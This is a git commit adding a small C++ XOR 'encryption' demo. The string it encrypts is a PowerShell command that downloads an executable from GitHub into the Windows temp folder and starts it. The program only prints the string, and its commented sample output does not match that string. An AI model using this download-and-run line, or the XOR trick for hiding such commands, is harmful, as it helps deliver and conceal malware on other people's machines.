164d26b94944150b52c1cc54ccd7a9a920dfea5f
Andrey <88719652+andreyquerino@users.noreply.github.com>
2021-08-10 11:57:39 -0300

    Add files via upload

---
+++ C/CriptografiaXor.cpp
@@ -0,0 +1,29 @@
+// @AndreyQuerino
+//
+// Compilação linux g++/i686-w64-mingw32-g++ <filename>.cpp -o <filname>.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
+// Compilação windows g++ <filename>.cpp -o <filname>.exe
+//
+// Simples criptografia xor
+
+#include<bits/stdc++.h>
+
+void Decrypter(char* Encrypt_Decrypt) { 
+    char Chave[2] = {4, 4}; //Coloque quantas chaves quiser
+    for (int i = 0; i < (strlen(Encrypt_Decrypt)); i++){ 
+        Encrypt_Decrypt[i] = Encrypt_Decrypt[i] ^ Chave[i % (sizeof(Chave) / sizeof(char))]; 
+        printf("%c",Encrypt_Decrypt[i]); 
+    } 
+} 
+
+int main() { 
+    char Run[] = "powershell.exe wget https://github.com/andreyquerino/Coisas/blob/main/C/MrQuerino/MrQuerino.exe?raw=true -o C:\\windows\\temp\\WelComeMr.exe;start C:\\windows\\temp\\WelComeMr.exe"; //Texto
+    printf("Encriptado: "); 
+    Decrypter(Run); 
+    printf("\n"); 
+    printf("Decripitado: "); 
+    Decrypter(Run);
+}
+
+// Saída
+// Encripitado: sss*cmplqf*gki+ej`va}uqavmjk
+// Decripitado: www.github.com/andreyquerino
